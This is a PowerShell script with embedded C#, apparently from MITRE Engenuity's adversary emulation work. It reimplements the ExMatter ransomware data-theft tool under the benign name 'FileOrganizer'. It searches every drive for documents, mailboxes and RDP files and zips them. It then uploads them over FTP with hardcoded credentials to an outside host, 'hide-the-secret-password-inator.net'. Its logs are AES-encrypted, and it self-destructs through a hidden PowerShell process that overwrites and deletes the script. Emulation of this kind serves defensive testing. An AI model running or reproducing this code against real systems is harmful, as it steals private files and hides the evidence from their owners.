# ---------------------------------------------------------------------------
# ExMatterBackup.ps1 - Alternative PowerShell script if execution of ExMatter binary fails

# Copyright 2024 MITRE Engenuity. Approved for public release. Document number CT0005.
# Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

# This project makes use of ATT&CK®
# ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# Usage: ./ExMatterBackup.ps1

# Revision History:

# --------------------------------------------------------------------------- 

$code = @"

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace FileOrganizer
{
    public class FileOrganizer
    {
        // used for file discovery. restrictions on which files to put in the targetFiles list
        private static readonly int MIN_BYTES = 4096; // minimum file size in bytes
        private static readonly int MAX_BYTES = 67108864; // maximum file size in bytes
        private static readonly string[] GOOD_EXTS = new string[] // file extensions we want to target
        {
            ".bmp",
            ".doc",
            ".docx",
            ".dwg",
            ".ipt",
            ".jpeg",
            ".jpg",
            ".msg",
            ".pdf",
            ".png",
            ".pst",
            ".rdp",
            ".rtf",
            ".sql",
            ".txt",
            ".xls",
            ".xlsx",
            ".zip"
        };
        private static readonly string[] BAD_DIRS = new string[] // directories we want to avoid
        {
            "\\AppData\\Local\\Microsoft",
            "\\AppData\\Local\\Packages",
            "\\AppData\\Roaming\\Microsoft",
            "C:\\`$Recycle.Bin",
            "C:\\Documents and Settings",
            "C:\\PerfLogs",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\ProgramData",
            "C:\\Users\\All Users\\Microsoft",
            "C:\\Windows"
        };
        private static List<FileInfo> targetFiles = new List<FileInfo>(); // store the target files for processing

        // used for zip and log files
        public static string cwd = Directory.GetCurrentDirectory();
        public static readonly string zipExt = ".zip";
        private static List<FileInfo> zipFiles = new List<FileInfo>();
        private static readonly bool LOG_ENC = true;

        private static readonly bool outputExceptions = true;

        public static void SetCurrentWorkingDirectory(string dir)
        {
            cwd = dir;
        }

        public static string GetZipOutPath()
        {
            return cwd + "\\archive";
        }

        public static string GetZipExt()
        {
            return zipExt;
        }

        public static string GetLogFilePath()
        {
            return cwd + "\\EMlog.txt";
        }
 
        public static void SetupLogs()
        {
            Logger.InitializeLogger(GetLogFilePath(), encryptLogs: LOG_ENC);
        }

        public static void ProcessDrives()
        {
            // get information of logical drives and put them in array
            DriveInfo[] allDrives = GetDriveInfos();

            // look through logical drives and gather target files
            foreach (DriveInfo d in allDrives)
            {
                FindTargetFiles(d);
            }

            Logger.Info("[+] Completed searching for target files");
        }

        public static DriveInfo[] GetDriveInfos()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            Logger.Info("[+] Outputting drive information: ");

            foreach (DriveInfo d in allDrives)
            {
                Logger.Info(String.Format("Drive {0}", d.Name));
                Logger.Info("/---------------------------------------------------------\\");
                Logger.Info(String.Format("| Drive type                      | {0,21} |", d.DriveType));
                if (d.IsReady == true)
                {
                    Logger.Info(String.Format("| Volume label                    | {0,21} |", d.VolumeLabel));
                    Logger.Info(String.Format("| File system                     | {0,21} |", d.DriveFormat));
                    Logger.Info(String.Format("| Available space to current user | {0,15} bytes |", d.AvailableFreeSpace));
                    Logger.Info(String.Format("| Total available space           | {0,15} bytes |", d.TotalFreeSpace));
                    Logger.Info(String.Format("| Total size of drive             | {0,15} bytes |", d.TotalSize));
                }
                Logger.Info("\\---------------------------------------------------------/");
                Logger.Info("");
            }

            Logger.Info("[+] Completed outputting drive information");

            return allDrives;
        }

        public static void FindTargetFiles(DriveInfo d)
        {
            DirectoryInfo diTop = new DirectoryInfo(d.Name);
            Logger.Info(String.Format("[*] Searching for files in drive {0}", d.Name));
            FindTargetFilesRecurse(diTop);

            Logger.Info("[+] Target files located:");
            Logger.Info("File Name\t| File Size\t| Last Write Time");

            foreach (FileInfo fi in targetFiles)
            {
                Logger.Info(String.Format("{0}\t| {1:N0}\t| {2}", fi.FullName, fi.Length, File.GetLastWriteTime(fi.FullName)));
            }

            Logger.Info(String.Format("[+] Completed searching for target files in drive {0}", d.Name));
        }

        public static void FindTargetFilesRecurse(DirectoryInfo diTop)
        {
            try
            {
                foreach (FileInfo fi in diTop.EnumerateFiles())
                {
                    try
                    {
                        if (IsTargetFile(fi))
                        {
                            targetFiles.Add(fi);
                            Logger.Info(String.Format("[+] Found file {0}", fi.FullName));
                        }
                    }
                    catch (Exception e)
                    {
                        if (outputExceptions)
                        {
                            Logger.Error(String.Format("[!] Caught exception {0} for parsing {1}: {2}", e.GetType().Name, fi.FullName, e.Message));
                            Logger.Warn(String.Format("\t[*] Skipping {0}. Reason: encountered exception.", fi.FullName));
                        }
                    }
                }
                foreach (DirectoryInfo di in diTop.EnumerateDirectories("*"))
                {
                    try
                    {
                        bool badDir = IsBadDir(di);
                        if (!badDir)
                        {
                            FindTargetFilesRecurse(di);
                        }
                        else
                        {
                            Logger.Info(String.Format("\t[*] Skipping {0}.", di.FullName));
                        }
                    }
                    catch (Exception e)
                    {
                        if (outputExceptions)
                        {
                            Logger.Error(String.Format("[!] Caught exception {0} for parsing {1}: {2}", e.GetType().Name, di.FullName, e.Message));
                            Logger.Warn(String.Format("\t[*] Skipping {0}. Reason: encountered exception.", di.FullName));
                        }
                    }
                }
            }
            catch (Exception e)
            {
                if (outputExceptions)
                {
                    Logger.Error(String.Format("[!] Caught exception {0} for parsing {1}: {2}", e.GetType().Name, diTop.FullName, e.Message));
                }
            }
        }

        public static bool IsTargetFile(FileInfo fi)
        {
            return fi.Length > MIN_BYTES && // file isn't too small
                   fi.Length < MAX_BYTES && // file isn't too large
                   GOOD_EXTS.Contains(fi.Extension.ToLower()) && // file has good extension
                   !((fi.Attributes & FileAttributes.System) == FileAttributes.System) && // file isn't a system file
                   !((fi.Attributes & FileAttributes.Temporary) == FileAttributes.Temporary); // file isn't a temporary file
        }

        public static bool IsBadDir(DirectoryInfo dir)
        {
            string dirStr = dir.FullName;
            bool retVal = false;

            // if the directory is a symlink or junction, skip it
            // these are skipped to avoid duplicates/errors and if it is a good dir it will get looked at eventually
            if ((dir.Attributes & FileAttributes.ReparsePoint) == FileAttributes.ReparsePoint)
            {
                return true;
            }

            // loop through the directories we do not want to look in (badDir)
            foreach (string badDir in BAD_DIRS)
            {
                int found = dirStr.IndexOf(badDir);

                // check if dir contains badDir
                if (found != -1) // value of -1 denotes not found
                {
                    /* 
                     * put any contents after the bad dir into a string
                     * example:
                     * C:\Users\rshovan\AppData\Local\Microsoft is a bad dir, but
                     * C:\Users\rshovan\AppData\Local\MicrosoftEdge is not
                     * the former will have an str of "" and the latter will have an str of "Edge"
                     * so, if str != "", then we want to look in it
                    */
                    string str = dirStr.Substring((found + badDir.Length));
                    if (str != "")
                    {
                        continue; // skip over the below check
                    }

                    // cover case where dir is exactly badDir
                    // and the few AppData bad dirs
                    if (dirStr.Contains(badDir))
                    {
                        retVal = true;
                        break;
                    }
                }
            }
            return retVal;
        }

        public static void SortTargetFileList()
        {
            Logger.Info("[*] Sorting target files by Last Write Time.");

            targetFiles.Sort(CompareLastWriteTime); // sort by LastWriteTime attribute
            targetFiles = Enumerable.Reverse(targetFiles).ToList(); // put newest files on top of list

            Logger.Info("File Name\t| File Size\t| Last Write Time");
            foreach (FileInfo fi in targetFiles) // output new list of files
            {
                Logger.Info(String.Format("{0}\t| {1:N0}\t| {2}", fi.FullName, fi.Length, File.GetLastWriteTime(fi.FullName)));
            }

            Logger.Info("[+] Completed sorting target files by Last Write Time.");
        }

        public static int CompareLastWriteTime(FileInfo f1, FileInfo f2)
        {
            return DateTime.Compare(File.GetLastWriteTime(f1.FullName), File.GetLastWriteTime(f2.FullName));
        }

        public static List<String> GetTargetFilePaths()
        {
            List<String> paths = new List<String>();

            foreach (FileInfo file in targetFiles)
            {
                paths.Add(file.FullName);
            }

            return paths;
        }

        public static void AddZipToList(string zip)
        {
            zipFiles.Add(new FileInfo(zip));
        }

        public static void UploadFilesWrapper(string host, string username, string password, string destDir)
        {
            UploadFiles(host, username, password, destDir, zipFiles);
        }

        public static void UploadFiles(string host, string username, string password, string destDir, List<FileInfo> zips)
        {
            Logger.Info(String.Format("[*] Uploading {0} archives to ftp", zips.Count));

            string batchfileStr = String.Format("open {0}\n{1}\n{2}\npwd\nmkdir {3}\ncd {3}\n", host, username, password, destDir);

            foreach (FileInfo zip in zips)
            {
                batchfileStr += "put " + zip.FullName + "\n";
            }

            batchfileStr += "ls\nquit";

            string batchfilePath = cwd + "\\batchfile.txt";

            Logger.Info(String.Format("[*] ftp batchfile path: {0}", batchfilePath));
            Logger.Info(String.Format("[*] ftp batchfile: {0}", batchfileStr));

            StreamWriter writer = new StreamWriter(batchfilePath);
            writer.WriteLine(batchfileStr);
            writer.Close();

            ProcessStartInfo si = new ProcessStartInfo()
            {
                FileName = @"ftp.exe",
                Arguments = @"-s:" + batchfilePath + @"",
                UseShellExecute = false,
                RedirectStandardOutput = true
            };

            Logger.Info(String.Format("[*] Spawning ftp process with arguments: {0}", si.Arguments));

            Process p = new Process()
            {
                StartInfo = si
            };

            try
            {
                p.Start();
                Logger.Info("[+] Spawned ftp process. This may take a minute to complete.");
                Logger.Debug("[*] process output: " + p.StandardOutput.ReadToEnd());
                p.WaitForExit();
            }
            catch (Exception e)
            {
                Logger.Error(String.Format("[!] Caught exception {0} for spawning ftp process: {1}", e.GetType().Name, e.Message));
            }
        }

        public static void Cleanup()
        {
            Logger.Info("[*] Execution complete. Performing cleanup.");

            foreach (FileInfo fi in zipFiles)
            {
                try
                {
                    fi.Delete();
                }
                catch (Exception e)
                {
                    Logger.Error(String.Format("[!] Caught exception {0} for deleting zip files: {1}", e.GetType().Name, e.Message));
                }
            }

            try
            {
                FileInfo batchFile = new FileInfo(cwd + "\\batchfile.txt");
                batchFile.Delete();
            }
            catch (Exception e)
            {
                Logger.Error(String.Format("[!] Caught exception {0} for deleting batchfile: {1}", e.GetType().Name, e.Message));
            }

            Logger.Info("[+] Cleanup complete.");
        }

        public static void Destroy(string target)
        {
            Logger.Info("[*] Destroying binary.");

            ProcessStartInfo si = new ProcessStartInfo()
            {
                FileName = @"powershell.exe",
                Arguments = @"-WindowStyle Hidden -Command "" `$path = '" + target + @"';" +
                            @"Start-Sleep -Seconds 5;" +
                            @"Get-Process | Where-Object {$_.Path -like `$path} | Stop-Process -Force *>> '" + GetLogFilePath() + @"';" +
                            @"[byte[]]`$arr = new-object byte[] 65536;" +
                            @"Set-Content -Path `$path -Value `$arr *>> '" + GetLogFilePath() + @"';" +
                            @"Remove-Item -Path `$path *>> '" + GetLogFilePath() + @"';""",
                CreateNoWindow = true,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process p = new Process()
            {
                StartInfo = si
            };

            try
            {
                p.Start();
                Logger.Info("[+] Spawned powershell destructor.");
            }
            catch (Exception e)
            {
                Logger.Error(String.Format("[!] Caught exception {0} for spawning powershell destructor: {1}", e.GetType().Name, e.Message));
            }
            finally
            {
                Environment.Exit(0);
            }
        }
    }

    public class Logger
    {
        static readonly object _logLock = new object();
        public static string LogPath = "";
        private static bool initialized = false;
        private static bool _encryptLogs = false;
        private static byte[] logEncKey =
        {
            0x03, 0x70, 0xdd, 0x5a, 0xdd, 0xcd, 0x98, 0x0e,
            0x8f, 0x4b, 0x42, 0x4c, 0x92, 0xd8, 0x04, 0x9e,
            0x99, 0xc7, 0xc7, 0xc5, 0xd0, 0x9e, 0xed, 0xfc,
            0xc5, 0x8f, 0x6a, 0xbc, 0xa9, 0xe7, 0x2f, 0x99
        };

        public static void InitializeLogger(string logPath, bool encryptLogs = false)
        {
            LogPath = logPath;
            initialized = true;
            _encryptLogs = encryptLogs;
        }

        public static void Debug(string logMessage)
        {
            if (!initialized) return;
            try
            {
                LogMessage("DEBUG", logMessage, LogPath);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public static void Info(string logMessage)
        {
            if (!initialized) return;
            try
            {
                LogMessage("INFO", logMessage, LogPath);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public static void Warn(string logMessage)
        {
            if (!initialized) return;
            try
            {
                LogMessage("WARN", logMessage, LogPath);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public static void Error(string logMessage)
        {
            if (!initialized) return;
            try
            {
                LogMessage("ERROR", logMessage, LogPath);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static void LogMessage(string verbosity, string msg, string path)
        {
            if (!initialized) return;
            string formatted = String.Format(
                "[{0}] {1}: {2}",
                verbosity,
                DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
                msg
            );
            Console.WriteLine(formatted);
            string toWrite = _encryptLogs ? Encryption.SimpleEncryptAndEncode(logEncKey, formatted) : formatted;
            lock (_logLock)
            {
                File.AppendAllText(path, toWrite + "\n");
            }
        }
    }

    public class Encryption
    {
        public static string SimpleEncryptAndEncode(byte[] key, string input)
        {
            return Convert.ToBase64String(SimpleEncrypt(key, Encoding.UTF8.GetBytes(input)));
        }

        public static byte[] SimpleEncrypt(byte[] key, byte[] input)
        {
            if (input == null)
                throw new ArgumentNullException("input can not be null.");
            if (key == null)
                throw new ArgumentNullException("key can not be null.");
            if (key.Length != 32)
                throw new Exception("AES key must be 32 bytes.");

            using (var ms = new MemoryStream())
            {
                using (var aesProvider = Aes.Create())
                {
                    aesProvider.KeySize = 256;
                    aesProvider.BlockSize = 128;
                    aesProvider.Mode = CipherMode.CBC;
                    aesProvider.Padding = PaddingMode.PKCS7;
                    aesProvider.Key = key;
                    aesProvider.GenerateIV();

                    using (var cs = new CryptoStream(ms, aesProvider.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        ms.Write(aesProvider.IV, 0, aesProvider.IV.Length); // write next 16 bytes the IV, followed by ciphertext
                        cs.Write(input, 0, input.Length);
                        cs.FlushFinalBlock();
                    }
                }
                return ms.ToArray();
            }
        }

        public static string SimpleDecodeAndDecrypt(byte[] key, string input)
        {
            return Encoding.UTF8.GetString(SimpleDecrypt(key, Convert.FromBase64String(input)));
        }

        public static byte[] SimpleDecrypt(byte[] key, byte[] input)
        {
            if (input == null)
                throw new ArgumentNullException("input can not be null.");
            if (key == null)
                throw new ArgumentNullException("key can not be null.");
            if (key.Length != 32)
                throw new Exception("AES key must be 32 bytes.");

            using (var ms = new MemoryStream(input))
            {
                using (var aesProvider = Aes.Create())
                {
                    aesProvider.KeySize = 256;
                    aesProvider.BlockSize = 128;
                    aesProvider.Mode = CipherMode.CBC;
                    aesProvider.Padding = PaddingMode.PKCS7;
                    aesProvider.Key = key;

                    byte[] iv = new byte[16];
                    ms.Read(iv, 0, 16); // read next 16 bytes for IV, followed by ciphertext
                    aesProvider.IV = iv;

                    using (var cs = new CryptoStream(ms, aesProvider.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        byte[] temp = new byte[ms.Length - 16 + 1];
                        byte[] data = new byte[cs.Read(temp, 0, temp.Length)];
                        Buffer.BlockCopy(temp, 0, data, 0, data.Length);
                        return data;
                    }
                }
            }
        }
    }
}

"@

Add-Type -TypeDefinition $code -Language CSharp

[FileOrganizer.FileOrganizer]::SetCurrentWorkingDirectory((Get-Location).Path)
[FileOrganizer.FileOrganizer]::SetupLogs()
[FileOrganizer.FileOrganizer]::ProcessDrives()
[FileOrganizer.FileOrganizer]::SortTargetFileList()

# Process Files

# Get the list of target files from c#
$pathsFull = [FileOrganizer.FileOrganizer]::GetTargetFilePaths()
# Remove duplicates in list
$paths = $pathsFull | Select-Object -Unique
$currentZipNum = 0

$msg = "[*] Beginning processing " + $paths.Count + " target files for upload"
[FileOrganizer.Logger]::Info($msg)

# Loop through list of target files and create zips
for ($i = 0; $i -lt $paths.Count; $i += 100)
{
    $zipOutPath = [FileOrganizer.FileOrganizer]::GetZipOutPath()
    $zipExt = [FileOrganizer.FileOrganizer]::GetZipExt()
    $zipName =  $zipOutPath + $currentZipNum + $zipExt
    [FileOrganizer.Logger]::Info("[*] Creating zip file $zipName")

    if ($paths.Count -ge $i + 100)
    {
        $pathArg = $paths[$i..($i+99)]
        [FileOrganizer.Logger]::Info("[*] Zipping 100 files")  
    }
    else
    {
        $pathArg = $paths[$i..$paths.Count]
        $msg = "[*] Zipping " + ($paths.Count - $i) + " files"
        [FileOrganizer.Logger]::Info($msg)
    }
    try {
        Compress-Archive -Path $pathArg -CompressionLevel 'Fastest' -DestinationPath $zipName
        [FileOrganizer.FileOrganizer]::AddZipToList($zipName);
        [FileOrganizer.Logger]::Info("[*] Successfully created zip file $zipName")
    } catch {
        [FileOrganizer.Logger]::Error("[*] Failed to create zip file $zipName. Error message: $_")
    }
    $currentZipNum++
}

[FileOrganizer.Logger]::Info("[*] Completed processing target files")

$destDir = "$(hostname)" + (Get-Date).ToString('yyyyMMddHHmmss')
[FileOrganizer.FileOrganizer]::UploadFilesWrapper("hide-the-secret-password-inator.net", "sftpupload", "Cardstock-Empirical", $destDir)
[FileOrganizer.FileOrganizer]::Cleanup()
[FileOrganizer.FileOrganizer]::Destroy($PsCommandPath)
